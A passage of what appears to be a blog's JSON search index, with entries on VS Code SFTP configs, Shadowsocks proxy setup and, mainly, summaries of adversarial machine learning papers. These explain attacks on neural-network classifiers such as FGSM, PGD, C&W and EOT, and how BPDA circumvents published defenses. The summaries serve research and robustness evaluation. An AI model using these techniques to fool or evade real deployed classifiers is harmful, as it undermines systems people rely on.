    "snippet": "A useful plugin is sftp which helps users to connect to the server with VS Code.The config file looks like that:{    \"name\": \"jason\",    \"host\": \"xx\",    \"port\": 22,    \"protocol\": \"sftp\",    \"user...",
    "content": "A useful plugin is sftp which helps users to connect to the server with VS Code.The config file looks like that:{    \"name\": \"jason\",    \"host\": \"xx\",    \"port\": 22,    \"protocol\": \"sftp\",    \"username\": \"user\",    \"password\": \"pwd\",    \"privateKeyPath\": \"/Users/User/.ssh/id_rsa\"}As to ftp-simple the config file looks like that:[\t{\t\t\"name\": \"jason\",\t\t\"host\": \"host\",\t\t\"port\": 22,\t\t\"type\": \"sftp\",\t\t\"username\": \"jason\",\t\t\"privateKey\": \"/Users/User/.ssh/id_rsa\",\t\t\"passphrase\": \"\",\t\t\"path\": \"/home/jason\",\t\t\"autosave\": true,\t\t\"confirm\": true\t}]The key point of running ftp-simple smoothly when using private key is that it is necessary to set passphrase in line 9 of the config file although its value is null. Or it will not connect the server with authorized failed."
  },
  
  {
    "title": "Adversarial Machine Learning Attack papers Summary",
    "url": "/posts/AdvML_Attack_Summary/",
    "categories": "",
    "tags": "Machine Learning",
    "date": "2020-03-22 00:00:00 -0700",
    





    
    "snippet": "In this blog, I summarize the top nine most important papers related to adversarial DNN attacking from the paper which promotes adversarial examples firstly to the advanced attacking methods such a...",
    "content": "In this blog, I summarize the top nine most important papers related to adversarial DNN attacking from the paper which promotes adversarial examples firstly to the advanced attacking methods such as C&amp;W attack, BPDA and EOT.FYI, I find a very useful lecture from Prof. Somesh Jha to summarize both the attack and defense on Machine Learning.1. Poisoning attack against support vector machinesAuthor-Time-ArXiv: Battista Biggio, Blaine Nelson, Pavel Laskov;ICML 2012; 1206.6389Keywords: Targeted Attack,The paper uses the gradient ascent attack on SVM to increase the model‚Äôs test error.2. Intriguing properties of neural networksAuthor-Time-ArXiv: Ian Goodfellow etc.;ICLR2014; 1312.6199Key points:  The input-space contains the semantic information in neural networks instead of individual units.  The input-output mapping is discontinuous so the perturbation will cause flips on prediction.  The perturbation is transferable.  Promoting a targeted attack based on box-constrained L-BFGS which is a matrix form of Newton‚Äôs method for optimization.2.1 IntroductionThere are two counter-intuitive properties of DNN which are the semantic meaning of individual units and the stability of neural network with small perturbations to inputs.Firstly, they conclude that the whole activation space contains the semantic information instead of the last feature layers‚Äô bias used in the researches before. Then, they find a small perturbation is able to change the network‚Äôs prediction. They take the training data which are perturbed by maximizing the prediction error as adversarial examples. What‚Äôs more, they figure out these adversarial examples are able to be transferred to another model trained on a different subset of the dataset. Consequently, the DNN model structure is connected to the data distribution in a non-obvious way.2.2 Blind Spots in Neural NetworksThe regions in input space mapped by the output unit contain no training examples nearby. These regions share label and the statistical structure of the original inputs. On the other hand, the smoothness assumption that predictions changed based on perturbations smoothly does not hold. So the local generalization of the training data are useful for finding adversarial examples in the input space.Formal DescriptionMinimize \\(c\\cdot\\vert\\vert r\\vert\\vert_2+loss_f(x+r,l)\\) subject to \\(x+r\\in [0,1]^m\\)\\(f:\\mathbb{R}^m\\rightarrow\\{1\\dots k\\}\\) is a classifier mapping image pixel value vectors to a discrete label set.\\(loss_f:\\mathbb{R}^m\\times\\{1\\dots k\\}\\rightarrow\\mathbb{R}^+\\) is a continuous loss function.Target label \\(l\\in\\{1\\dots k\\}\\)3. Explaining and Harnessing Adversarial ExamplesAuthor-Time-ArXiv: Ian Goodfellow etc.; ICLR2015;1412.6572Key Points:  The main cause of adversarial examples is DNN‚Äôs linear nature and the requirement is the sufficient dimensional inputs.  Promoting Fast Gradient Sign Method to generate adversarial examples.  Exploiting adversarial training on simple models and DNN models.3.1 The Linear Explanation and PerturbationThe appearance of adversarial examples is because the DNNs do not learn the true concepts of the whole data to complete the tasks. They are just trained under some discontinuous dataset. Consequently, the linearity of DNN models means that many small perturbations which cannot be detect by eyes will add up to a large change to output.A simple linear model can have adversarial examples if its input has enough dimensionality which is the reason softmax regression is vulnerable. So the paper promotes the fast gradient sign method. It generates adversarial examples to get an optimal max-norm constrained perturbation.\\[\\eta=\\epsilon sign(\\nabla_xJ(\\theta,x,y))\\]\\(\\theta\\) is the model parameters. \\(x\\) is the input while \\(y\\) is the target(true) label. \\(J(\\theta,x,y)\\) is the loss function and its gradient of \\(x\\) will represent the perturbation in every direction of \\(x\\).3.2 Adversarial TrainingMore work Needed: A example to use logistic regression model to train on adversarial examples with weight decay. While the problem is these adversarial examples will be under-fitting.The paper also uses adversarial training on DNN models. The objective function based on FGSM is an effective regularizer:\\[\\tilde J(\\theta,x,y)=\\alpha J(\\theta,x,y)+(1-\\alpha)J(\\theta,x+\\epsilon sign(\\nabla_xJ(\\theta,{x},y)))\\]It means that the adversarial examples update through training.3.3 ExploitThe adversarial examples appear in a contiguous subspace defined by FGSM. The paper also tries to confirm two hypotheses.      Adversarial training provides more constraint on the training process but the improvement is not enough.        Averaging several models which aims to wash out adversarial examples has only limited resistance.  Appendix: Rubbish Class ExamplesThese examples are degenerate inputs which are meaningless to any category (like noise) but are positive classes in the DNN models. The best result of these examples is prediction is low at any category.Guess:  Adversarial Examples exist because DNN cannot restrict all directions in the input space which will lead to a bad accuracy of the validation set.  We can use constraints of every classes in the input space to promote the robustness of DNN models.4. Adversarial Examples In the Physical WorldAuthor-Time-ArXiv: Alexey Kurakin etc.; ICLR2017; 1607.02533Key Points:  The ML systems in physical world scenarios are vulnerable to adversarial examples.  Promoting iterative FGSM and Least-likely Class Attack.  Exploiting the data transformation‚Äôs impact on adversarial examples.4.1 Iterative Fast Gradient Sign MethodThe paper puts forward two iterative FGSMs which are basic iterative method and iterative least-likely class method.4.1.1 Basic iterative FGSMThe basic iterative method which is a non-targeted attack generates adversarial examples as follow:\\[X_0^{adv} = X, X_{N+1}^{adv}=Clip_{X,\\epsilon}\\{X_N^{adv}+\\alpha sign(\\nabla_XJ(X_N^{adv},y_{true}))\\}\\]\\(X\\) is a 3-D tensor(width, height, depth) which are integers in the range [0, 255]. \\(y_{true}\\) is the ground truth. \\(J({X},y)\\) is cross-entropy cost function of neural network. \\(Clip_{X,\\epsilon}\\{X'\\}\\) clip the image per-pixel so the result image is \\(L_\\infty\\) \\(\\epsilon\\)-neighborhood of the original image.\\[Clip_{X,\\epsilon}\\{X'\\}(x,y,z)=min\\{255, X(x,y,z)+\\epsilon,max\\{0,X(x,y,z)-\\epsilon,X'(x,y,z)\\}\\}\\]where \\({X}(x,y,z)\\) is the value of \\(z\\) of the image \\({X}\\) at coordinated \\((x,y)\\).4.1.2 Iterative least-likely Class MethodThe iterative least-likely class method, also called LLC, is a targeted attack. The target label is defined as \\(y_{LL}=\\underset{x}{\\mathrm{argmin}}\\{p(y\\vert {X})\\}\\) which presents the least likely class in the whole categories.\\[{X}_0^{adv} = {X}, {X}_{N+1}^{adv}=Clip_{X,\\epsilon}\\{X_N^{adv}-\\alpha sign(\\nabla_XJ({X}_N^{adv},y_{LL}))\\}\\]4.2 Adversarial Examples in Real WorldThe transformations such as blur, noise and JPEG encoding have impact on destructing adversarial examples while changing brightness or contrast is not useful.5. The Limitations of Deep Learning in Adversarial SettingsAuthor-Time-ArXiv: Nicolas Papernot etc.; EuroS&amp;P2016; 1511.07528Key Points:  Promoting Jacobian-based Saliency Map Attack for acyclic DNN models.In general, the Jacobian-based saliency map constructs the saliency map, the impact of input based on the output‚Äôs gradient to find the most important features and then changes them to generate adversarial examples.The JSM method iterates the following steps when \\(F(X^*)\\ne Y^*\\) and \\(\\vert\\vert \\delta_X\\vert\\vert &lt; \\Upsilon\\)      Forward Derivative of a Deep Neural Network from the input to the layer before output    A general idea to calculate the forward derivative for a given \\(X\\): \\(\\nabla F(X)=\\frac{\\partial F(X)}{\\partial X}=[\\frac{\\partial F_j(X)}{\\partial x_i}]_{i,j\\in 1\\dots M}\\) and the formula is essentially the Jacobian of the function.    As to the DNN model, the Jacobian can be computed as follow:\\[\\frac{\\partial F_j(X)}{\\partial x_i}=(W_{n+1,j}\\cdot\\frac{\\partial H_n}{\\partial x_i})\\times\\frac{\\partial f_{n+1,j}}{\\partial x+i}(W_{n+1,j}\\cdot H_n+b_{n+1,j})\\]    where the output neuron \\(j\\) computes the following expression: \\(F_j(X)=f_{n+1,j}(W_{n+1,j}\\cdot H_n+b_{n+1.j})\\)        Constructing the Saliency Map \\(S(X,t)\\) which aims to increase the probabilities of target label \\(t\\) and decrease the probabilities of other labels.\\[S(X,t)[i]=\\begin{cases} 0~if\\frac{F_t(X)}{\\partial X_i}&lt;0 ~or~ \\mathop{\\Sigma}_\\limits{j\\ne t}\\frac{F_j(X)}{\\partial X_i}&gt;0\\\\(\\frac{F_t(X)}{\\partial X_i})\\vert \\sum_{j\\ne t}\\frac{F_j(X)}{\\partial X_i}\\vert~otherwise\\end{cases}\\]    where \\(t=\\mathop{\\arg\\max}_\\limits{j}F_j(X)\\)        Modifying \\(X_{i_{max}}\\) subject to \\(i_{max}=\\mathop{\\arg\\max}_\\limits{i}S(X,Y^*)[i]\\) and adding to the original sample. And the perturbation adding to the input will be set as \\(+/-1\\) which will increase or decrease the pixel intensities.  6. Towards Evaluating the Robustness of Neural NetworksThe details are available on another blog.7. Towards Deep Learning Models Resistant to Adversarial AttacksAuthor-Time-ArXiv: Aleksander Madry etc.; ICLR2018; 1706.060083Key Points:  Promoting Projected Gradient Descent Method(PGD).The essence of PGD attack is that a robust DNN model is required to improve a robust attack. So it will improve both the DNN models and adversarial examples at the same time. The paper defines DNN attack as a min-max optimization problem instead of a minimization or maximization problem:\\(\\mathop{\\min}_\\limits{\\theta} \\rho(\\theta)\\), where \\(\\rho(\\theta)=\\mathbb{E}_{(x,y)\\sim D}[max_{\\delta\\in S}L(\\theta,x+\\delta,y)]\\)\\(D\\) is the data contribution. \\(\\mathbb{E}\\) is the average error in the course of training. In the inner max part, it will find the specific \\(\\delta\\) to maximize the loss while in the outer min part, it will use different model parameters \\(\\theta\\) to reduce the average error.The paper uses FGSM and iterative FGSM which is essentially projected gradient descent. The definition of the PGD is displayed as follow:\\[x^{t+1}=\\prod_{x+S}(x^t+\\alpha sign(\\nabla_xL(\\theta,x,y)))\\]\\(\\prod_{x+S}\\) means projecting the input in the range of \\(x+S\\). And the definition of projection can be described as follows:\\[min_x f(x)~s.t.~x\\in S\\]\\[p^{t+1} = x^t+\\alpha sign(\\nabla f(x^t)) \\\\ x^{t+1} = \\text{arg} \\min_{x \\in C} \\vert\\vert p^{t+1}-x\\vert\\vert\\]8. Obfuscated Gradients Give a False Sense of Security: Circumventing Defenses to Adversarial ExamplesAuthor-Time-ArXiv: Anish Athalye etc; ICML2018 Best Paper; 1802.00420Key Points:  Promoting Backward Pass Differentiable Approximation(BPDA) which is useful on obfuscated-gradient-based defenses.  Displaying that BPDA has a great performance on several gradient-masking based defense methods from ICLR 2018.Basically, the advanced defense method is to break gradient descent by gradient masking. So in the paper, three defense obfuscated gradients are discussed to evaluate the performance of BPDA.  Shattered Gradient  Stochastic Gradients  Exploding and Vanishing Gradients8.1 The Algorithm of Backward Pass Differentiable ApproximationIn general, the BPDA uses the following steps based on iterative optimization-based attack(PGD for \\(l_\\infty\\) and C&amp;W attack for \\(l_2\\)):Algorithm:Let \\(f(\\cdot)=f^{1\\dots j}(\\cdot)\\) be a neural network and let \\(f^i(\\cdot)\\) be a non-differentiable layer.  To approximate \\(\\nabla_xf(x)\\), find a differentiable approximation identity function \\(g(x)\\) such that \\(g(x)\\approx f^i(x)\\).      Calculate \\(\\nabla_xf(x)\\) by performing the forward pass through \\(f( \\cdot )\\).    On the backward pass, replacing \\(f^i(x)\\) with \\(g(x)\\).In contrast to standard PGD or C&amp;W attack, BPDA requires more iterations of gradient descent.The paper lists 7 accepted papers from ICLR2018 and takes them as the evaluation to show the great performance of BPDA.8.2 Gradient ShatteringAt first, it evaluates the non-obfuscated gradients defense like adversarial training and cascade adversarial training which trains a first model to generate adversarial examples and adds them to a second model on the augmented dataset in a single step for efficiency. Since these two defenses are weaker than the later defenses, the paper does not discuss them deeply.8.2.1 Thermometer EncodingThe definition of thermometer encoding is like that. Given an image \\(x\\), for each pixel color \\(x_{i,j,c}\\), the $l$-level thermometer encoding \\(\\tau(x_{i,k,c})\\) is a \\(l\\)-dimensional vector where \\(\\tau(x_{i,j,c})_k=1\\) if \\(x_{i.k.c}&gt;k/l\\) and \\(0\\) otherwise. For example, \\(\\tau(0.66)=1111110000\\) is a 10-level thermometer encoding.In general, thermometer encoding defense can be taken as a way to cause gradient shattering so it is impossible to perform gradient descent on such kind of DNNs.As to BPDA, the paper sets \\(g(x)=min(max(x_{i,j,c}-k/l,0),1)\\) and replaces the backwards pass with \\(g(x)\\).Actually \\(\\tau(x_{i,j,c})_k=floor(g(x))\\). The result shows a great performance of BPDA.8.2.2 Input TransformationsThe defense method uses several input transformations to counter adversarial examples such as image cropping and rescaling, bit-depth reduction and JPEG compression.However, the paper points out that it is possible to bypass each defense respectively and the ensembles of these defenses are not stronger than the sub-defense. The paper uses EOT and BPDA (the paper does not provide details) to circumvent image cropping and rescaling, JPEG compression, image quilting. And the performance of BPDA is also pretty good.8.2.3 Local Intrinsic DimensionalityLID is a general-purpose metric that measures the distance from an input to its neighbors.The paper discovers LID does not detect high confidence adversarial examples even the adversarial examples are oblivious to the defense.8.3 Stochastic Gradients8.3.1 Stochastic Activation PruningSAP randomly drops some neurons of each layer to 0 with probability proportional to their absolute value. Essentially, SAP applies dropout at each layer based on neurons‚Äô weighted distribution. Then these dropped out neurons are retrained and scaled up to retain accuracy.Implementing SAP decreases clean classification accuracy slightly while increasing robustness. And different levels of drop probability  has similar robustness.The paper calculates gradient by \\(\\sum_{i=1}^k\\nabla_xf(x)\\) where \\(k=10\\) to achieve useful gradients instead of \\(\\nabla_xf(x)\\). Finally, the result of the attack is good as well.8.3.2 Mitigating Through RandomizationThe defense adds a randomization layer before the input to the classifier by rescaling and zero-pading the images. The defense dismisses attack by providing lots of choices of randomness.The paper finds the ensemble attack used by the defense authors overfits to these fixed randomization. So the paper uses EOT and optimize the distribution of transformations to bypass the defense.The result of the attack is good.8.4 Vanishing &amp; Exploding Gradients8.4.1 Pixel DefendThe defense‚Äôs authors argue that adversarial examples mainly lie in the low-probability region of the data distribution. So PixelDefend purifies adversarially perturbed images before the classification by using a greedy decoding procedure to approximate finding the highest probability example within an \\(\\epsilon\\)-ball of the input image.      Firstly, the joint distribution over all pixels is defined by the product of conditional distributions which originate from PixelCNN. \\(X=[x_1,x_2,\\dots,x_n]\\) presents an image.\\[p_{CNN}(X)=\\prod_ip_{CNN]}(x_i\\vert x_{1:(i-1)})\\]    Every conditional distribution is a multinomial with a 256-way softmax layer based on previous RGB channels as well and each channel variable \\(x_i\\) takes 0 to 255 distinct values. The higher the joint distribution \\(P_{CNN}\\), the more suitable it is to the dataset        The general distribution of datasets is described by bits per dimension. \\(I,J,K\\) are the size and channel of images.    \\(BPD(X)=-logp_{CNN}(X)/(I\\times J\\times K\\times log2)\\).        The defense‚Äôs authors use hypothesis testing to detect adversarial examples based on distribution.        Returning benign images to the training distribution.\\[max_{X^*}p_{CNN}(X^*)\\\\s.t.\\vert\\vert X^*-X\\vert\\vert_{\\infty}\\le\\epsilon_{defend}\\]  The paper avoids computing gradients by approximating gradients with BPDA.8.4.2 Defense-GanDefense-Gan uses GAN to project samples onto the manifold of the generator before classification.The BPDA attack does not have a good performance on Defense-Gan.9. Synthesizing Robust Adversarial ExamplesAuthor-Time-ArXiv: Anish Athalye etc.; ICML2018; 1707.07397Key Points:  Promoting Expectation Over Transformation(EOT) which proves the impact of a single adversarial example exists over all of the transformations.  Fabricating the first 3D physical-world adversarial objects to fool classifiers in the real world.The basic approach to generate adversarial examples which aims to maximize the possibility of target label based on the perturbation is not useful when angle and viewpoint changes. Consequently, EOT uses a chosen distribution \\(T\\) of transformation functions \\(t\\) to adjust the input \\(x\\) as  \\(t(x)\\). The perturbation is also set by the expected effective distance as: \\(\\delta=\\mathbb{E}_{t\\sim T}[d(t(x'),t(x))]\\). EOT aims to minimize the visual difference between \\(t(x')\\) and \\(t(x)\\). So the optimization problem has been:\\(\\mathop{\\arg\\max}\\limits_{x'}\\mathbb{E}_{t\\sim T}[logP(y_t\\vert t(x'))]\\), subject to \\(\\mathbb{E}_{t\\sim T}[d(t(x'), t(x))]&lt;\\epsilon, x\\in[0,1]^d\\).The distribution \\(T\\) can model perceptual distortions like rotation, translation or noising. EOT uses SGD to maximize the objective. In the 2D cases, \\(t(x)=Ax+b\\) is used for random transformations. EOT also sets distance as \\(l_2\\) norm in LAB color space which is a perceptually uniform color space in Euclidean distance. So the optimization is set as follow and using PGD to maximize the objective before clipping the set of valid inputs:\\[\\mathop{\\arg\\max}_\\limits{x'}\\mathbb{E}_{t\\sim T}[logP(y_t\\vert t(x'))-\\lambda\\vert\\vert LAB(t(x'))-LAB(t(x))\\vert\\vert_2]\\]"
  },
  
  {
    "title": "Evaluation of Adversarial Example Defenses",
    "url": "/posts/Evaluation_of_Adversarial_Example_Defenses/",
    "categories": "",
    "tags": "PhD",
    "date": "2020-03-06 00:00:00 -0800",
    





    
    "snippet": "On Adaptive Attacks to Adversarial Example DefensesAuthors: Florian Tramer, Nicholas Carlini, Wieland Brendel, Aleksander MadryKey Points:  Thirteen Advanced Defenses Evaluation      Introduction  ...",
    "content": "On Adaptive Attacks to Adversarial Example DefensesAuthors: Florian Tramer, Nicholas Carlini, Wieland Brendel, Aleksander MadryKey Points:  Thirteen Advanced Defenses Evaluation      Introduction    Nowadays many defense methods are not efficient enough to be described and evaluated because they do not use proper attacks to evaluate the performance. So the paper analyses thirteen recent defenses by performing adaptive attack in the right way by adjusting objective functions and  hyper-parameters.        Background    The widely adopted approach is promoted by CW attack and Madry. For example, normalization function includes sigmoid function based on the $l_p$-norm.\\[x_{i+1}=Proj(x_i+\\alpha \\cdot normalize(\\nabla_{x_i} L(x_i,y)))\\]    There are four common attack strategies:          Projected Gradient Descent     - C&amp;W attack: \\(maximize_{x'}L(x',y)-\\lambda\\cdot\\vert\\vert x'-x\\vert\\vert_p\\)      Back Pass Differentiable Approximation: Replacing one layer of a neural network \\(f^i(x)\\) by an approximate function \\(g(x)\\) when computing gradient by back propagation if the layer is non-differentiable.     - Expectation Over Transformation: computing gradient by randomized components such as randomized transformation.            Attack Themes    The whole paper will evaluate thirteen defense methods in the following seven prospectives.          Strive for simplicity as to loss function and gradient descent.     - Attack the full defense.      Identify and target important defense parts.     - Adapt the objective function to simplify the attack.      Ensure the loss function is consistent which is a good proxy for attack success.     - Optimize the loss function with different methods      Use a strong adaptive attack for adversarial training or these generated adversarial examples are useless.            K-Winners Take All    Essence: Replacing the standard ReLU activation function by outputting k largest elements in every layer and setting 0 to other elements to avoid gradient-based attack in a neural network.    The results of different types of attack:          Gradient-based attack: not working because adversary can just find the direction in a very small region which is meaningless.      Black-box attack                  score-based attack: working          decision-based attack: working if it is convergence.          transfer-based attack: being proved that it is not working in the original paper                          The Odds are Odd    Essence:  "
  },
  
  {
    "title": "C&W Attack",
    "url": "/posts/C&W_Attack/",
    "categories": "",
    "tags": "PhD",
    "date": "2020-02-15 00:00:00 -0800",
    





    
    "snippet": "C&amp;W attack is a pretty insightful attack in adversarial machine learning. So I use this blog to summarize the general ideas of it.Towards Evaluating the Robustness of Neural NetworksAuthors: Ni...",
    "content": "C&amp;W attack is a pretty insightful attack in adversarial machine learning. So I use this blog to summarize the general ideas of it.Towards Evaluating the Robustness of Neural NetworksAuthors: Nicholas Carlini, David WagnerKey points:  Seven Objective Functions  Three Box Constraints  $c$ choosing method  Three Attack Methods  Images‚Äô discretizationThe paper introduces a famous attacking method called CW attack. They demonstrate defensive distillation is not robust and promising enough under their attacking and CW attack is a better benchmark for future defense methods. Besides, they suggest defense should prevent the transferability of the adversarial examples.1. IntroductionAs we all know, deep neural networks are vulnerable to adversarial examples. And there are several methods to robust these models like defensive distillation. The authors construct three attacks for \\(L_0, L_1, L_\\infty\\) to prove the weakness of these defensive methods and discover that adversarial examples are transferable between different models.2. BackgroundIn the project, the authors assume the adversary is accessible to all of the neural network as a white-box attacking. They evaluate the targeted attack in three conditions: Average case(select random target), Best case(select least difficult target) and Worst case(select most difficult target). On the other hand, when discussing the distance of the adversarial examples, the authors use three metrics from \\(L_p\\) norm to generate these examples. The p-norm is defined as  \\(\\vert\\vert v \\vert\\vert_p=(\\sum_{i=1}^n\\vert v_i\\vert^p)^{\\frac{1}{p}}\\).3. ApproachThe authors discuss four currently advanced attacking methods including L-BFGS, FGS, JSMA and Deepfool. They use two networks for MNIST and CIFAR-10 classification and the pre-trained Inception v3 network for Image-Net classification.The initial method to find adversarial examples is listed as follows:minimize \\(D(x, x+\\delta )\\)  such that \\(C(x+\\delta)=t, x+\\delta\\in[0,1]^n\\)\\(\\delta\\) means perturbation and \\(D()\\) is the distance metric from p-norms while \\(C(x)=argmax_iF(x)_i\\) is the classifier to set label. \\(\\delta\\) can be found by minimizing \\(D(x,x+\\delta)\\).The authors discuss seven objective functions changing \\(C(x+\\delta)=t\\) to \\(f(x+\\delta)\\leq0\\). The final problem has been edited as follows:minimize \\(\\vert \\vert \\delta \\vert \\vert +c\\cdot f(x+\\delta)\\), such that \\(x + \\delta \\in [0,1]^n\\).\\(c\\) is a constant setting by binary search. After testing, there is a key that the objective function cannot have a great changeable derivation because \\(c\\) should change as well to balance the weights between \\(\\delta\\) and \\(f(x+\\delta)\\).After setting the math problem, the constraint should be clear, the authors list three ways to do the job.  Projected gradient descent  Clipped gradient descent  Change of variables4. Three Attacks and their Objective Functions4.1 \\(L_2\\) Attackminimize \\(\\vert \\vert \\frac{1}{2}(tanh(w)+1)-x\\vert \\vert^2_2+c\\cdot f(\\frac{1}{2}(tanh(w)+1))\\) with \\(f\\) defined as \\(f(x')=max(max\\{Z(x')_i:i\\neq t\\}-Z(x')_t, -\\kappa)\\).\\(\\kappa\\) presents the confidence of the \\(i\\)th label and the  \\(\\kappa\\) is set \\(0\\) in the paper. As you can see, the bigger \\(\\kappa\\), the higher success rate of attacking.Besides, to avoid local optimization, they use multiple starting-point gradient descent in the ball of adversarial range.4.2 \\(L_0\\) AttackIterating fixing less important pixels and using \\(L_2\\) attack. After every iteration, they compute \\(g=\\nabla f(x+\\delta)\\) and select \\(i=\\mathop{\\arg\\min}_\\limits{i}g_i\\cdot\\delta_i\\) and then fix \\(i\\).4.3 \\(L_\\infty\\) Attackminimize \\(c\\cdot f(x+\\delta)+\\sum_i [(\\delta_i-\\tau)^+]\\). Using \\(\\tau\\) to set a threshold to avoid adding perturbation on several most influential pixels.The \\(L\\infty\\) distance measures the maximum change to any of the coordinates: \\(\\vert\\vert x-x'\\vert\\vert_\\infty=max(\\vert x_1-x'_1\\vert,\\dots,\\vert x_n-x'_n\\vert)\\)"
  },
  
  {
    "title": "Adversarial Machine Learning",
    "url": "/posts/Adversarial-Machine-Learning/",
    "categories": "",
    "tags": "Security",
    "date": "2020-01-31 00:00:00 -0800",
    





    
    "snippet": "I try to summarize the main ideas and advanced technologies in this blog. Besides, I will record the progresses and details about the process. As we know, Adversarial Machine Learning has many appl...",
    "content": "I try to summarize the main ideas and advanced technologies in this blog. Besides, I will record the progresses and details about the process. As we know, Adversarial Machine Learning has many applications. From the talk of Ian Goodfellow from ICLR2019, the applications include generative Modeling, Security, Model-based optimization, RL, extreme reliability, label efficiency, domain adaptation, Fairness accountability and transparency and Neuroscience.1. Basic Concepts and AlgorithmsFirstly, I need to confirm some basic concepts and their abbreviations, such as Adversarial Example(AE), Targeted Attack(TA) and Un-targeted Attack(UA). The types of attacking and metrics are listed as follows.Un-targeted Attack:  Non-iterative Un-targeted attacks: Fast Gradient Sign Method, R+FGSM  Iterative Un-targeted attacks: Basic Iterative Method, Projected Gradient Descent(PGD), U-MI-FGSM, Deep Fool, Universal Adversarial Perturbation, OptMarginTargeted AttackÔºöSpecifying the label to be the least likely class.  Non-iterative Targeted attacks: Least-Likely Class(LLC) attack, R+LLC  Iterative Targeted attacks: Box-constrained L-BFGS(BLB), Iterative LLC, targeted MI-FGSM(T-MI-FGSM), Jacobian-based Saliency Map Attack(JSMA), Carlini and Wagner(CW) attack, Elastic-net Attack to DNNs(EAD), Expectation Over Transformation(EOT),Backward Pass Differentiable Approximation(BPDA)Attacking Metrics:  Misclassification: Misclassification Ratio, Average Confidence of Adversarial Class(ACAC), Average Confidence of True Class(ACTC)  Imperceptibility: Average \\(L_p\\) Distortion, Average Structural Similarity, Perturbation Sensitivity Distance(PSD)  Robustness: Noise Tolerance Estimation, Robustness to Gaussian Blur(RGB), Robustness to Image CompressionSecondly, the defense part is listed as follows.Adversarial Training: Naive Adversarial Training(NAT), Ensemble Adversarial Training(EAT),  PGD-based Adversarial Training(PAT)Gradient Masking/Regularization: Defensive Distillation, Input Gradient Regularization(IGR)Input Transformation: Ensemble Input Transformation(EIT), Random Transformations-based defense(RT), Pixel Defense(PD), Thermometer Encoding(TE)Region-based ClassificationDetection-only Defenses: Local Intrinsic Dimensionality(LID), Feature Squeezing(FS), MagNetDefensing Metrics:  Classification Accuracy Variance(CAV)  Classification Rectify/Sacrifice Ratio(CRR/CSR)  Classification Confidence Variance(CCV)  Classification Output Stability(COS)2. AttackWhen we talk about the adversarial machine learning, we need to the set the threat model firstly. A threat model will outline the attacking type and the defensing ways including the evaluation of the defense. In the adversary‚Äôs part of a threat model, goals, knowledge and capabilities will be clear.  Goals: generating inputs to force a ML system to conclude erroneous results.  Knowledge: the knowledge the adversary is assumed to have.  Capabilities: the requirements and the methods of the attacking.          Causing bit-flips on the weights of a neural network.      Causing errors during the data processing pipeline.      Making backdoors.      Perturbing the images to fool the ML systems.      To be more specific, for some natural input \\(x\\) and similarity metric \\(D\\), \\(x'\\) is a adversarial example if \\(D(x, x')\\leq \\epsilon\\) for some small \\(\\epsilon\\) and \\(x'\\) is misclassified. A choice for \\(D\\) is \\(l_p\\)-norm. While the choice of \\(D\\) and \\(\\epsilon\\) varies based on the missions and a small \\(\\epsilon\\) is not always important for malware detection. The definition of the adversary‚Äôs capability can be set as follows.(1) \\(\\large{\\mathbb{E}_{(x,y)\\sim\\chi}[max_{x':D(x,x')&lt;\\epsilon}L(f(x'),y)]}\\): \\(L\\) means loss function.(2) \\(\\large{\\mathbb{E}_{(x,y)\\sim\\chi}[min_{x'\\in A_{x,y}}D(x,x')]}\\): \\(A_{x,y}\\) results from the definition of adversarial example, e.g. \\(A_{x,y}=\\{x'\\rvert x' \\neq y\\}\\) for misclassification.3. Defense EvaluationAfter summarizing the algorithms of adversarial machine learning, I need to specify the defense methods to evaluate the performances.At the very beginning, the aim of the defense is as follows.  Defend against an adversary who will attack the system.  Test the worst-case situations of algorithms.  Measure progress of algorithmsBasically, the challenge of security evaluations is the difficulty to evaluate the worst-case robustness and  the different assumptions between vision and security.On the other hands, when we evaluate the algorithms or frameworks, we need to be clear about the requirements. For example, if one proposes a defense method, he should do things as follows.(1) Be skeptical of the results.(2) Try to find the best way to attack the defense method, even if it is not from the existing adversarial attacks.(3) Release full source code and pre-trained models.There is a basic way to complete the evaluation and the pitfall needed to avoid from [3] chapter 3.  State a precise threat model  Perform adaptive attacks  Release pre-trained models and source code  Report clean model accuracy when not under attack  Perform basic sanity tests on attack success rates  Generate an attack success rate vs. perturbation budget curve  Verify adaptive attacks perform better than any other  Describe the attacks applied, including all hyper-parametersMore information is available form [3]4. Important ResearchesNow I want to summarize some important and intuitive papers to dig some real problems and have a deep understanding about them. The reading path is introduced from [5].4.1 Evasion Attacks against Machine Learning at Test Time4.2 Intriguing properties of neural networks4.3 Explaining and Harnessing Adversarial ExamplesReference:  DEEPSEC: A Uniform Platform for Security Analysis of Deep Learning Model  A critique of the DeepSec Platform for Security Analysis of Deep Learning Models  On Evaluating Adversarial Robustness  A complete list of all adversarial example papers  Adversarial Machine Learning Reading List"
  },
  
  {
    "title": "How to deploy shadowsocks and Kcptun on ubuntu server",
    "url": "/posts/How_to_Deploy_Shadowsocks_And_Kcptun_on_Ubuntu_Server/",
    "categories": "",
    "tags": "Network",
    "date": "2019-11-13 00:00:00 -0800",
    





    
    "snippet": "Install Shadowsocks  Install shadowsocks  sslocal -c ss.json  .json file:{\"server\":\"11.22.33.44\",\"server_port\":443,\"local_port\":1080,\"password\":\"123456\",\"timeout\":600,\"method\":\"aes-256-cfb\"}Install...",
    "content": "Install Shadowsocks  Install shadowsocks  sslocal -c ss.json  .json file:{\"server\":\"11.22.33.44\",\"server_port\":443,\"local_port\":1080,\"password\":\"123456\",\"timeout\":600,\"method\":\"aes-256-cfb\"}Install KCPTUN  Install kcptunUse gdrive to download files and directories on Ubuntu Server  Install gdrive by git clone  Register your personal Google Drive Client ID and Secret Key: tutorial  Replace the Client ID and Secret Key on the file handlers_drive.go  go get; go build; sudo mv gdrive /usr/local/bin; gdrive aboutUseful informaitonSet Shadowsocks on Mac command line  open shadowsocks application: Proxy Auto Configure Mode  add ~/.zshrc by alias proxy='export all_proxy=socks5://127.0.0.1:1086' alias unproxy='unset all_proxy'Be careful about the port which may be different based on the configuration  source ~/.zshrc  using proxy to go by server whiel using unproxy to go directly  test: curl cip.cc"
  },
  
  {
    "title": "Jekyll Tutorial",
    "url": "/posts/Jeykll_Tutorial/",
    "categories": "",
    "tags": "Website",
    "date": "2019-10-03 00:00:00 -0700",
    





    
    "snippet": "First thing: Jekyll is a static website framework which is useful for building a blog. Jekyll is build by ruby and need to use gem as a package management.FYI: most of the content of the blog is ba...",
